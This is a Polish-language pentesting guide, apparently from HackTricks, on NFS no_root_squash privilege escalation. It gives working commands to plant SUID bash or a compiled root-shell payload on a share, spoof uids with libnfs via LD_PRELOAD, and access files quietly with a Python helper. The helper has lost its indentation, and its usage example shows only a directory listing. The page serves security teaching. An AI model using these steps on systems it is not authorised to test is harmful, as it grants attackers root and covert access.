# Eskalacja uprawnień wynikająca z błędnej konfiguracji NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}


## Podstawowe informacje o Squashing

NFS zazwyczaj (szczególnie w systemie Linux) ufa wskazanym przez klienta wartościom `uid` i `gid` podczas uzyskiwania dostępu do plików (jeśli nie jest używany Kerberos). Istnieją jednak konfiguracje, które można ustawić na serwerze, aby **zmienić to zachowanie**:

- **`all_squash`**: mapuje wszystkie dostępy, przypisując każdego użytkownika i grupę do **`nobody`** (65534 bez znaku / -2 ze znakiem). W rezultacie wszyscy są użytkownikiem `nobody` i żadne konta użytkowników nie są używane.
- **`root_squash`/`no_all_squash`**: jest to ustawienie domyślne w systemie Linux i **mapuje tylko dostęp z uid 0 (root)**. W rezultacie każde `UID` i `GID` jest zaufane, ale `0` jest mapowane do `nobody` (dzięki czemu podszywanie się pod root nie jest możliwe).
- **``no_root_squash`**: po włączeniu tej konfiguracji nawet użytkownik root nie jest mapowany. Oznacza to, że jeśli zamontujesz katalog z tą konfiguracją, możesz uzyskać do niego dostęp jako root.

W pliku **/etc/exports**, jeśli znajdziesz katalog skonfigurowany z opcją **no_root_squash**, możesz **uzyskać do niego dostęp** jako **klient** i **zapisywać w tym katalogu** tak, jakbyś był lokalnym użytkownikiem **root** na danej maszynie.

Więcej informacji o **NFS** znajdziesz tutaj:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Eskalacja uprawnień

### Zdalny exploit

Opcja 1 z użyciem bash:
- **Zamontowanie tego katalogu** na maszynie klienckiej, a następnie **skopiowanie jako root** do zamontowanego folderu pliku binarnego **/bin/bash**, nadanie mu uprawnień **SUID** i **uruchomienie z maszyny ofiary** tego pliku binarnego bash.
- Pamiętaj, że aby uzyskać uprawnienia root w udziale NFS, na serwerze musi być skonfigurowana opcja **`no_root_squash`**.
- Jeśli jednak opcja ta nie jest włączona, możesz przeprowadzić eskalację do innego użytkownika, kopiując plik binarny do udziału NFS i nadając mu uprawnienie SUID jako użytkownikowi, do którego chcesz uzyskać dostęp.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 z użyciem skompilowanego kodu C:
- **Zamontowanie tego katalogu** na komputerze klienckim, a następnie **skopiowanie jako root** do zamontowanego folderu naszego skompilowanego payloadu, który wykorzysta uprawnienia SUID, nadanie mu uprawnień **SUID** i **uruchomienie na komputerze ofiary** tego pliku binarnego (tutaj znajdziesz przykładowe [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Te same ograniczenia co wcześniej
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Należy pamiętać, że jeśli możesz utworzyć **tunel ze swojej maszyny do maszyny ofiary, nadal możesz użyć wersji Remote, aby przeprowadzić exploit tej eskalacji uprawnień, tunelując wymagane porty**.\
> Poniższy trik ma zastosowanie, gdy plik `/etc/exports` **wskazuje adres IP**. W takim przypadku **w żadnym razie nie będziesz w stanie użyć** **remote exploit** i konieczne będzie **nadużycie tego triku**.\
> Kolejnym wymaganiem, aby exploit zadziałał, jest to, aby **export wewnątrz `/etc/export`** **używał flagi `insecure`**.\
> --_Nie jestem pewien, czy ten trik zadziała, jeśli `/etc/export` wskazuje adres IP_--

### Basic Information

Scenariusz obejmuje exploit zamontowanego udziału NFS na lokalnej maszynie, wykorzystując lukę w specyfikacji NFSv3, która pozwala klientowi określić swój uid/gid, potencjalnie umożliwiając nieautoryzowany dostęp. Exploit polega na użyciu [libnfs](https://github.com/sahlberg/libnfs) — biblioteki umożliwiającej fałszowanie wywołań NFS RPC.

#### Compiling the Library

Kroki kompilacji biblioteki mogą wymagać dostosowania w zależności od wersji kernela. W tym konkretnym przypadku wywołania systemowe fallocate zostały zakomentowane. Proces kompilacji obejmuje następujące polecenia:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Przeprowadzanie Exploit

Exploit polega na utworzeniu prostego programu w języku C (`pwn.c`), który podnosi uprawnienia do root, a następnie uruchamia shell. Program jest kompilowany, a wynikowy plik binarny (`a.out`) umieszczany na share z suid root, przy użyciu `ld_nfs.so` do sfałszowania uid w wywołaniach RPC:

1. **Skompiluj kod exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Umieść exploit na share i zmodyfikuj jego uprawnienia, fałszując uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Wykonaj exploit, aby uzyskać uprawnienia root:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell do dyskretnego dostępu do plików

Po uzyskaniu dostępu root, aby korzystać z udziału NFS bez zmieniania właściciela (i uniknąć pozostawiania śladów), używany jest skrypt Python (nfsh.py). Skrypt dostosowuje uid do wartości odpowiadającej plikowi, do którego uzyskiwany jest dostęp, umożliwiając korzystanie z plików na udziale bez problemów z uprawnieniami:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Uruchom jako:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
